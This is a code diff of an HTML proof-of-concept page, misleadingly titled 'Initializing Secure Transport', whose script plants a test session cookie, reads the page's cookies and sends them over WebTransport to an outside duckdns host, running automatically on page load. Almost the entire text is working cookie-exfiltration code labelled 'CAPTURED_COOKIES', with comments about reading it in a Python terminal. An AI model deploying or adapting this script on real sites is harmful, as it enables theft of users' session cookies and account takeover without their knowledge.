@@ -7,32 +7,44 @@
     <h1>Initializing Secure Transport...</h1>
     <script>
         async function runExfil() {
+    // 1. SET THE COOKIE (The "Victim" Data)
+    // We set a test cookie that expires in 1 hour
+    document.cookie = "user_session=SECRET_DATA_12345; path=/; max-age=3600; SameSite=Lax";
+    console.log("Cookie planted.");
+
     const url = 'https://webrtc-poc.duckdns.org';
     
     try {
         const transport = new WebTransport(url);
         await transport.ready;
+        console.log("WebTransport Connected!");
 
-        // --- THE DATA GATHERING PART ---
-        // Let's try to grab all cookies as a test
-        let sensitiveData = document.cookie || "No Cookies Found";
+        // 2. READ THE COOKIE
+        const cookies = document.cookie;
         
-        // If you want to test with a hardcoded string again:
-        // sensitiveData = "user_auth=CAPTURED_ADMIN_TOKEN_999";
+        // 3. EXFILTRATE THE DATA
+        if (cookies) {
+            const stream = await transport.createUnidirectionalStream();
+            const writer = stream.getWriter();
+            
+            // We label it so it's easy to read in the Python terminal
+            const payload = `CAPTURED_COOKIES: ${cookies}`;
+            const data = new TextEncoder().encode(payload);
+            
+            await writer.write(data);
+            await writer.close();
+            console.log("Cookies exfiltrated successfully.");
+        } else {
+            console.log("No cookies found to exfiltrate.");
+        }
 
-        const stream = await transport.createUnidirectionalStream();
-        const writer = stream.getWriter();
-        const data = new TextEncoder().encode(sensitiveData);
-        
-        await writer.write(data);
-        await writer.close();
-        
     } catch (e) {
         console.error("Exfil failed:", e);
     }
 }
-        // Trigger on page load
-        runExfil();
+
+// Execute the flow
+runExfil();
     </script>
 </body>
 </html>
